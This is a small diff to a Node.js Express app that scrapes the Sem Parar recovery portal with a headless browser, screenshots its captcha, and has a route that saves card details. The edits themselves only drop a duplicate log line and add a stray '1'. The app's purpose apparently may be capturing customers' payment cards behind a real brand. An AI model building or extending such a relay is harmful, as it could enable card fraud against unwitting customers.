@@ -121,7 +121,6 @@ app.get("/", async (req, res) => {
       "https://portaldenegociacao.semparar.com.br/recuperaportal/"
     );
     console.log("Entrou no semparar");
-    console.log("Entrou no semparar");
     await captchaScreenshot(page);
 
     app.use(express.static(path.join(__dirname, "views")));
@@ -265,7 +264,7 @@ app.post("/cadastrar-cartao", async (req, res) => {
     res.status(500).send("Ocorreu um erro ao salvar os dados do cartão.");
   }
 });
-
+1
 // Rota para renderizar a página de erro com o valor de isErro
 app.get("/erro", async (req, res) => {
   const { isErro } = req.query; // Obtém o valor de isErro da consulta de URL
